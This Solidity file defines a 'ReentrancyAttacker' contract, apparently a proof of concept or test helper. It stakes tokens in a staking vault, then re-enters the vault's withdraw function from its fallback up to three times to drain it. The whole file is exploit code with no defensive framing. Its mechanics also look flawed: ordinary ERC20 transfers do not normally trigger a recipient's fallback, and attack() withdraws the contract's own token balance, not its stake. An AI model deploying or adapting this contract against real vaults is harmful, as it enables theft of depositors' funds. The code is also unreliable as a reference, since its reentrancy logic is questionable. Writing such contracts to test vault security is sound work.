// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStakingVault {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function claimRewards() external;
}

contract ReentrancyAttacker {
    IStakingVault public vault;
    IERC20 public token;
    uint256 public attackCount;

    constructor(address _vault, address _token) {
        vault = IStakingVault(_vault);
        token = IERC20(_token);
    }

    function stake(uint256 amount) external {
        token.approve(address(vault), type(uint256).max);
        vault.stake(amount);
    }

    function attack() external {
        vault.withdraw(token.balanceOf(address(this)));
    }

    // Reentrancy hook — called when vault sends tokens
    receive() external payable {}
    fallback() external {
        if (attackCount < 3) {
            attackCount++;
            if (token.balanceOf(address(vault)) > 0) {
                vault.withdraw(token.balanceOf(address(this)));
            }
        }
    }
}
